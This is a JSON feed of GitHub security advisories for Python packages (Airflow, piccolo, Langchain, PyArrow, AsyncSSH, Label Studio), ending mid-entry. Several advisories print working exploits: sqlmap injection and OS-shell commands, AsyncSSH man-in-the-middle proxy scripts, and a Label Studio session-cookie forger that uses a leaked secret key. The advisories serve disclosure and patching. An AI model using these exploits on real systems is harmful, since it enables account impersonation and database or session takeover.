{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Apache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.&nbsp; Users should upgrade to version 2.7.3 or later which has removed the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47037\">https://nvd.nist.gov/vuln/detail/CVE-2023-47037</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/33413\">https://github.com/apache/airflow/pull/33413</a></li>\n<li><a href=\"https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0\">https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/11/12/1\">http://www.openwall.com/lists/oss-security/2023/11/12/1</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hm9r-7f84-25c9\">https://github.com/advisories/GHSA-hm9r-7f84-25c9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hm9r-7f84-25c9",
            "title": "[apache-airflow] Apache Airflow allows authenticated and DAG-view authorized users to modify some DAG run detail values when submitting notes",
            "date_modified": "2023-11-13T20:43:21.000Z",
            "date_published": "2023-11-12T15:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hm9r-7f84-25c9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The handling of named transaction savepoints in all database implementations is vulnerable to <a href=\"https://owasp.org/www-community/attacks/SQL_Injection\">SQL Injection</a> as user provided input is passed directly to <code>connection.execute(...)</code> via f-strings.</p>\n<h3 id=\"details\">Details</h3>\n<p>An excerpt of the Postgres savepoint handling:</p>\n<pre><code class=\"language-python\">    async def savepoint(self, name: t.Optional[str] = None) -&gt; Savepoint:\n        name = name or f\"savepoint_{self.get_savepoint_id()}\"\n        await self.connection.execute(f\"SAVEPOINT {name}\")\n        return Savepoint(name=name, transaction=self)\n</code></pre>\n<p>In this example, we can see user input is directly passed to <code>connection.execute</code> without being properly escaped. </p>\n<p>All implementations of savepoints and savepoint methods directly pass this <code>name</code> parameter to <code>connection.execute</code> and are vulnerable to this. A non-exhaustive list can be found below:</p>\n<ul>\n<li>Postgres</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L239\">One</a></li>\n</ul>\n</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L133\">Two</a></li>\n</ul>\n</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L138\">Three</a></li>\n</ul>\n</li>\n<li>Sqlite</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L416\">One</a></li>\n</ul>\n</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L313\">Two</a></li>\n</ul>\n</li>\n<li><ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L318\">Three</a></li>\n</ul>\n</li>\n</ul>\n<p>Care should be given to ensuring all strings passed to <code>connection.execute</code> are properly escaped, regardless of how end user facing they may be.</p>\n<p>Further to this, the <a href=\"https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L404\">following method</a> also passes user input directly to an execution context however I have been unable to abuse this functionality at the time of writing. This method also has a far lower chance of being exposed to an end user as it relates to database init functionality.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The following FastAPI route can be used in conjunction with <a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a> to easily demonstrate the SQL injection.</p>\n<pre><code class=\"language-python\">DB = ...\n\n@app.get(\"/test\")\nasync def test(name):\n    async with DB.transaction() as transaction:\n        await transaction.savepoint(name)\n</code></pre>\n<h5 id=\"steps\">Steps</h5>\n<ol>\n<li>Create a standard Piccolo application with Postgres as a database backend</li>\n<li>Add the route shown previously</li>\n<li>Run your application, making a note of the URL it is served on</li>\n<li>Install <a href=\"https://github.com/sqlmapproject/sqlmap\">sqlmap</a></li>\n<li>In a terminal, run the following command substituting URL with your applications URL: <code>sqlmap -u \"http://URL/test?name=a\" --batch</code></li>\n<li>Observe sqlmap identifying the vulnerability</li>\n</ol>\n<p>For sqlmap help, <a href=\"https://github.com/sqlmapproject/sqlmap/wiki/Usage\">this usage guide</a> may be useful. The following commands may also be helpful to see the impact.</p>\n<h6 id=\"dumping-all-tables\">Dumping all tables</h6>\n<p>The <code>--tables</code> flag will enumerate all tables accessible from within the exposed database session.</p>\n<p><code>sqlmap -u \"http://URL/test?name=a\" --batch --tables</code></p>\n<p>An example output of this can be seen in the following screenshot.\n<img alt=\"Screenshot from 2023-11-06 23-10-30\" src=\"https://user-images.githubusercontent.com/47520067/280669236-5be9dc0f-4d2c-4bad-a1ba-fc1eb43fdb34.png\"></p>\n<h6 id=\"os-shell\">OS Shell</h6>\n<p>The <code>--os-shell</code> will drop the user into an OS shell on the underlying system if permissions permit. This can be seen in the attached screenshot which prints the databases current working directory. \n<img alt=\"Screenshot from 2023-11-06 22-43-50\" src=\"https://user-images.githubusercontent.com/47520067/280668670-0a152589-5f4c-468d-99b9-045226934007.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>While the likelihood of an end developer exposing a savepoints <code>name</code> parameter to a user is highly unlikely, it would not be unheard of. If a malicious user was able to abuse this functionality they would have essentially direct access to the database and the ability to modify data to the level of permissions associated with the database user. </p>\n<p>A non exhaustive list of actions possible based on database permissions is:</p>\n<ul>\n<li>Read all data stored in the database, including usernames and password hashes</li>\n<li>Insert arbitrary data into the database, including modifying existing records </li>\n<li>Gain a shell on the underlying server</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6\">https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47128\">https://nvd.nist.gov/vuln/detail/CVE-2023-47128</a></li>\n<li><a href=\"https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb\">https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xq59-7jf3-rjc6\">https://github.com/advisories/GHSA-xq59-7jf3-rjc6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xq59-7jf3-rjc6",
            "title": "[piccolo] piccolo SQL Injection via named transaction savepoints",
            "date_modified": "2023-11-12T15:57:29.000Z",
            "date_published": "2023-11-12T15:57:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xq59-7jf3-rjc6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Langchain before 0.0.329, prompt injection allows an attacker to force the service to retrieve data from an arbitrary URL, essentially providing SSRF and potentially injecting content into downstream tasks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-32786\">https://nvd.nist.gov/vuln/detail/CVE-2023-32786</a></li>\n<li><a href=\"https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1\">https://gist.github.com/rharang/d265f46fc3161b31ac2e81db44d662e1</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/12747\">https://github.com/langchain-ai/langchain/pull/12747</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/releases/tag/v0.0.329\">https://github.com/langchain-ai/langchain/releases/tag/v0.0.329</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6h8p-4hx9-w66c\">https://github.com/advisories/GHSA-6h8p-4hx9-w66c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6h8p-4hx9-w66c",
            "title": "[langchain] Langchain Server-Side Request Forgery vulnerability",
            "date_modified": "2023-11-11T05:04:05.000Z",
            "date_published": "2023-10-21T00:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6h8p-4hx9-w66c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).</p>\n<p>This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.</p>\n<p>It is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.</p>\n<p>If it is not possible to upgrade, maintainers provide a separate package <code>pyarrow-hotfix</code> that disables the vulnerability on older PyArrow versions. See <a href=\"https://pypi.org/project/pyarrow-hotfix/\">https://pypi.org/project/pyarrow-hotfix/</a>  for instructions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47248\">https://nvd.nist.gov/vuln/detail/CVE-2023-47248</a></li>\n<li><a href=\"https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n\">https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n</a></li>\n<li><a href=\"https://pypi.org/project/pyarrow-hotfix/\">https://pypi.org/project/pyarrow-hotfix/</a></li>\n<li><a href=\"https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf\">https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wvp-7f3h-6wmm\">https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5wvp-7f3h-6wmm",
            "title": "[pyarrow] PyArrow: Arbitrary code execution when loading a malicious data file",
            "date_modified": "2023-11-10T22:16:37.000Z",
            "date_published": "2023-11-09T09:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5wvp-7f3h-6wmm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue discovered in esptool 4.6.2 allows attackers to view sensitive information via weak cryptographic algorithm.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46894\">https://nvd.nist.gov/vuln/detail/CVE-2023-46894</a></li>\n<li><a href=\"https://github.com/espressif/esptool/issues/926\">https://github.com/espressif/esptool/issues/926</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3f38-96qm-r3fw\">https://github.com/advisories/GHSA-3f38-96qm-r3fw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3f38-96qm-r3fw",
            "title": "[esptool] esptool allows attackers to view sensitive information via weak cryptographic algorithm",
            "date_modified": "2023-11-09T22:10:34.000Z",
            "date_published": "2023-11-09T18:34:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3f38-96qm-r3fw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the remote end of an SSH client session via packet injection/removal and shell emulation.</p>\n<h3 id=\"details\">Details</h3>\n<p>The rogue session attack targets any SSH client connecting to an AsyncSSH server, on which the attacker must have a shell account. The goal of the attack is to log the client into the attacker's account without the client being able to detect this. At that point, due to how SSH sessions interact with shell environments, the attacker has complete control over the remote end of the SSH session. The attacker receives all keyboard input by the user, completely controls the terminal output of the user's session, can send and receive data to/from forwarded network ports, and is able to create signatures with a forwarded SSH Agent, if any. The result is a complete break of the confidentiality and integrity of the secure channel, providing a strong vector for a targeted phishing campaign against the user. For example, the attacker can display a password prompt and wait for the user to enter the password, elevating the attacker's position to a MitM at the application layer and enabling perfect shell emulation.</p>\n<p>The attacks work by the attacker injecting a chosen authentication request before the client's NewKeys. The authentication request sent by the attacker must be a valid authentication request containing his credentials. The attacker can use any authentication mechanism that does not require exchanging additional messages between client and server, such as password or publickey. Due to a state machine flaw, the AsyncSSH server accepts the unauthenticated user authentication request message and defers it until the client has requested the authentication protocol.</p>\n<h3 id=\"poc\">PoC</h3>\n<details>\n  <summary>AsyncSSH 2.14.0 client (simple_client.py example) connecting to AsyncSSH 2.14.0 server (simple_server.py example)</summary>\n\n<pre><code class=\"language-python\">#!/usr/bin/python3\nimport socket\nfrom threading import Thread\nfrom binascii import unhexlify\nfrom time import sleep\n\n##################################################################################\n## Proof of Concept for the rogue session attack (ChaCha20-Poly1305)            ##\n##                                                                              ##\n## Variant: Unmodified variant (EXT_INFO by client required)                    ##\n##                                                                              ##\n## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                 ##\n## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                 ##\n##                                                                              ##\n## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0 ##\n##################################################################################\n\n# IP and port for the TCP proxy to bind to\nPROXY_IP = '127.0.0.1'\nPROXY_PORT = 2222\n\n# IP and port of the server\nSERVER_IP = '127.0.0.1'\nSERVER_PORT = 22\n\n# Length of the individual messages\nNEW_KEYS_LENGTH = 16\nCLIENT_EXT_INFO_LENGTH = 60\n# Additional data sent by the client after NEW_KEYS (excluding EXT_INFO)\nADDITIONAL_CLIENT_DATA_LENGTH = 60\n\nnewkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\ndef contains_newkeys(data):\n    return newkeys_payload in data\n\nrogue_userauth_request = unhexlify('000000440b320000000861747461636b65720000000e7373682d636f6e6e656374696f6e0000000870617373776f7264000000000861747461636b65720000000000000000000000')\ndef insert_rogue_authentication_request(data):\n    newkeys_index = data.index(newkeys_payload)\n    # Insert rogue authentication request and remove SSH_MSG_EXT_INFO\n    return data[:newkeys_index] + rogue_userauth_request + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH:]\n\ndef forward_client_to_server(client_socket, server_socket):\n    delay_next = False\n    try:\n        while True:\n            client_data = client_socket.recv(4096)\n            if delay_next:\n                delay_next = False\n                sleep(0.25)\n            if contains_newkeys(client_data):\n                print(\"[+] SSH_MSG_NEWKEYS sent by client identified!\")\n                if len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:\n                    print(\"[+] client_data does not contain all messages sent by the client yet. Receiving additional bytes until we have 156 bytes buffered!\")\n                while len(client_data) &lt; NEW_KEYS_LENGTH + CLIENT_EXT_INFO_LENGTH + ADDITIONAL_CLIENT_DATA_LENGTH:\n                    client_data += client_socket.recv(4096)\n                print(f\"[d] Original client_data before modification: {client_data.hex()}\")\n                client_data = insert_rogue_authentication_request(client_data)\n                print(f\"[d] Modified client_data with rogue authentication request: {client_data.hex()}\")\n                delay_next = True\n            if len(client_data) == 0:\n                break\n            server_socket.send(client_data)\n    except ConnectionResetError:\n        print(\"[!] Client connection has been reset. Continue closing sockets.\")\n    print(\"[!] forward_client_to_server thread ran out of data, closing sockets!\")\n    client_socket.close()\n    server_socket.close()\n\ndef forward_server_to_client(client_socket, server_socket):\n    try:\n        while True:\n            server_data = server_socket.recv(4096)\n            if len(server_data) == 0:\n                break\n            client_socket.send(server_data)\n    except ConnectionResetError:\n        print(\"[!] Target connection has been reset. Continue closing sockets.\")\n    print(\"[!] forward_server_to_client thread ran out of data, closing sockets!\")\n    client_socket.close()\n    server_socket.close()\n\nif __name__ == '__main__':\n    print(\"--- Proof of Concept for the rogue session attack (ChaCha20-Poly1305) ---\")\n    mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    mitm_socket.bind((PROXY_IP, PROXY_PORT))\n    mitm_socket.listen(5)\n\n    print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n\n    try:\n        while True:\n            client_socket, client_addr = mitm_socket.accept()\n            print(f\"[+] Accepted connection from: {client_addr}\")\n            print(f\"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.\")\n            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            server_socket.connect((SERVER_IP, SERVER_PORT))\n            print(\"[+] Spawning new forwarding threads to handle client connection.\")\n            Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()\n            Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()\n    except KeyboardInterrupt:\n        client_socket.close()\n        server_socket.close()\n        mitm_socket.close()\n</code></pre>\n</details>\n\n<h3 id=\"impact\">Impact</h3>\n<p>The impact heavily depends on the application logic implemented by the AsyncSSH server. In the worst case, the AsyncSSH server starts a shell for the authenticated user upon connection, switching the user to the authenticated one. In this case, the attacker can prepare a modified shell beforehand to perform perfect phishing attacks and become a MitM at the application layer. When the username of the authenticated user is not used beyond authentication, this vulnerability does not impact the connection's security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm\">https://github.com/ronf/asyncssh/security/advisories/GHSA-c35q-ffpf-5qpm</a></li>\n<li><a href=\"https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e\">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c35q-ffpf-5qpm\">https://github.com/advisories/GHSA-c35q-ffpf-5qpm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c35q-ffpf-5qpm",
            "title": "[asyncssh] AsyncSSH Rogue Session Attack",
            "date_modified": "2023-11-09T18:35:16.000Z",
            "date_published": "2023-11-09T18:35:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c35q-ffpf-5qpm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An issue in AsyncSSH v2.14.0 and earlier allows attackers to control the extension info message (RFC 8308) via a man-in-the-middle attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The rogue extension negotiation attack targets an AsyncSSH client connecting to any SSH server sending an extension info message. The attack exploits an implementation flaw in the AsyncSSH implementation to inject an extension info message chosen by the attacker and delete the original extension info message, effectively replacing it.</p>\n<p>A correct SSH implementation should not process an unauthenticated extension info message. However, the injected message is accepted due to flaws in AsyncSSH. AsyncSSH supports the server-sig-algs and global-requests-ok extensions. Hence, the attacker can downgrade the algorithm used for client authentication by meddling with the value of server-sig-algs (e.g. use of SHA-1 instead of SHA-2).</p>\n<h3 id=\"poc\">PoC</h3>\n<details>\n    <summary>AsyncSSH Client 2.14.0 (simple_client.py example) connecting to AsyncSSH Server 2.14.0 (simple_server.py example)</summary>\n\n<pre><code class=\"language-python\"> #!/usr/bin/python3\n import socket\n from threading import Thread\n from binascii import unhexlify\n \n #####################################################################################\n ## Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ##\n ##                                                                                 ##\n ## Client(s) tested: AsyncSSH 2.14.0 (simple_client.py example)                    ##\n ## Server(s) tested: AsyncSSH 2.14.0 (simple_server.py example)                    ##\n ##                                                                                 ##\n ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##\n #####################################################################################\n \n # IP and port for the TCP proxy to bind to\n PROXY_IP = '127.0.0.1'\n PROXY_PORT = 2222\n \n # IP and port of the server\n SERVER_IP = '127.0.0.1'\n SERVER_PORT = 22\n \n # Length of the individual messages\n NEW_KEYS_LENGTH = 16\n SERVER_EXT_INFO_LENGTH = 676\n \n newkeys_payload = b'\\x00\\x00\\x00\\x0c\\x0a\\x15'\n def contains_newkeys(data):\n     return newkeys_payload in data\n \n # Empty EXT_INFO here to keep things simple, but may also contain actual extensions like server-sig-algs\n rogue_ext_info = unhexlify('0000000C060700000000000000000000')\n def insert_rogue_ext_info(data):\n     newkeys_index = data.index(newkeys_payload)\n     # Insert rogue extension info and remove SSH_MSG_EXT_INFO\n     return data[:newkeys_index] + rogue_ext_info + data[newkeys_index:newkeys_index + NEW_KEYS_LENGTH] + data[newkeys_index + NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:]\n \n def forward_client_to_server(client_socket, server_socket):\n     try:\n         while True:\n             client_data = client_socket.recv(4096)\n             if len(client_data) == 0:\n                 break\n             server_socket.send(client_data)\n     except ConnectionResetError:\n         print(\"[!] Client connection has been reset. Continue closing sockets.\")\n     print(\"[!] forward_client_to_server thread ran out of data, closing sockets!\")\n     client_socket.close()\n     server_socket.close()\n \n def forward_server_to_client(client_socket, server_socket):\n     try:\n         while True:\n             server_data = server_socket.recv(4096)\n             if contains_newkeys(server_data):\n                 print(\"[+] SSH_MSG_NEWKEYS sent by server identified!\")\n                 if len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:\n                     print(\"[+] server_data does not contain all messages sent by the server yet. Receiving additional bytes until we have 692 bytes buffered!\")\n                 while len(server_data) &lt; NEW_KEYS_LENGTH + SERVER_EXT_INFO_LENGTH:\n                     server_data += server_socket.recv(4096)\n                 print(f\"[d] Original server_data before modification: {server_data.hex()}\")\n                 server_data = insert_rogue_ext_info(server_data)\n                 print(f\"[d] Modified server_data with rogue extension info: {server_data.hex()}\")\n             if len(server_data) == 0:\n                 break\n             client_socket.send(server_data)\n     except ConnectionResetError:\n         print(\"[!] Target connection has been reset. Continue closing sockets.\")\n     print(\"[!] forward_server_to_client thread ran out of data, closing sockets!\")\n     client_socket.close()\n     server_socket.close()\n \n if __name__ == '__main__':\n     print(\"--- Proof of Concept for the rogue extension negotiation attack (ChaCha20-Poly1305) ---\")\n     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n     mitm_socket.bind((PROXY_IP, PROXY_PORT))\n     mitm_socket.listen(5)\n \n     print(f\"[+] MitM Proxy started. Listening on {(PROXY_IP, PROXY_PORT)} for incoming connections...\")\n \n     try:\n         while True:\n             client_socket, client_addr = mitm_socket.accept()\n             print(f\"[+] Accepted connection from: {client_addr}\")\n             print(f\"[+] Establishing new server connection to {(SERVER_IP, SERVER_PORT)}.\")\n             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n             server_socket.connect((SERVER_IP, SERVER_PORT))\n             print(\"[+] Spawning new forwarding threads to handle client connection.\")\n             Thread(target=forward_client_to_server, args=(client_socket, server_socket)).start()\n             Thread(target=forward_server_to_client, args=(client_socket, server_socket)).start()\n     except KeyboardInterrupt:\n         client_socket.close()\n         server_socket.close()\n         mitm_socket.close()\n</code></pre>\n</details>\n\n<h3 id=\"impact\">Impact</h3>\n<p>Algorithm downgrade during user authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5\">https://github.com/ronf/asyncssh/security/advisories/GHSA-cfc2-wr2v-gxm5</a></li>\n<li><a href=\"https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e\">https://github.com/ronf/asyncssh/commit/83e43f5ea3470a8617fc388c72b062c7136efd7e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cfc2-wr2v-gxm5\">https://github.com/advisories/GHSA-cfc2-wr2v-gxm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cfc2-wr2v-gxm5",
            "title": "[asyncssh] AsyncSSH Rogue Extension Negotiation",
            "date_modified": "2023-11-09T18:34:53.000Z",
            "date_published": "2023-11-09T18:34:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cfc2-wr2v-gxm5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability was found to affect versions before <code>1.8.2</code>, where a patch was introduced.</p>\n<h1 id=\"overview\">Overview</h1>\n<p>In <a href=\"https://github.com/HumanSignal/label-studio/tree/1.8.1\">Label Studio version 1.8.1</a>, a hard coded Django <code>SECRET_KEY</code> was set in the application settings. The Django <code>SECRET_KEY</code> is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.</p>\n<p>However, the Django framework inserts a <code>_auth_user_hash</code> claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) and forge session tokens for all users on Label Studio using the hard coded <code>SECRET_KEY</code>.</p>\n<h1 id=\"description\">Description</h1>\n<p>Below is the code snippet of the Django settings file at <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108\"><code>label_studio/core/settings/base.py</code></a>.</p>\n<pre><code class=\"language-python\"># SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n</code></pre>\n<p>This secret is hard coded across all instances of Label Studio.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below are the steps that an attacker could do to forge a session token of any account on Label Studio:</p>\n<ol>\n<li><p>Exploit the ORM Leak vulnerability (patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email <code>ghostccamm@testvm.local</code> with the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code> that was retrieved.</p>\n</li>\n<li><p>Create a new Django project with an empty application. In <code>cookieforge/cookieforge/settings.py</code> set the <code>SECRET_KEY</code> to <code>$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n</code>. Create a management command with the following code that will be used to create forged session tokens.</p>\n</li>\n</ol>\n<pre><code class=\"language-python\">from typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -&gt; None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -&gt; str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n</code></pre>\n<ol start=\"3\">\n<li>Next run the following command replacing the <code>{user_id}</code> with the user ID of the account you want to the impersonate and <code>{user_hash}</code> with the victim's password hash. Copy the session token that is printed.</li>\n</ol>\n<pre><code class=\"language-python\">python3 manage.py forgecookie {user_id} '{user_hash}'\n</code></pre>\n<ol start=\"4\">\n<li>Change the <code>sessionid</code> cookie on the browser and refresh the page. Observe being authenticated as the victim user.</li>\n</ol>\n<h1 id=\"impact\">Impact</h1>\n<p>This vulnerability can be chained with the ORM Leak vulnerability (which was patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.</p>\n<h1 id=\"remediation-advice\">Remediation 